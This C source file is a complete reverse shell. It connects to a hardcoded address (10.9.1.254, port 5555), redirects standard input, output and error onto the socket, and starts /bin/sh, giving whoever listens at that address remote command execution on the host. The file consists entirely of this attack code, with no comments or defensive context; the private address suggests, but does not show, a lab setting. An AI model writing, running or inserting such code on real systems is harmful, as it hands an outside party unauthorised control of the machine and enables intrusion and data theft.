#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "10.9.1.254"
#define SERVER_PORT 5555

int main() {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    connect(sock, (struct sockaddr*)&server, sizeof(server));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);
    return 0;
}

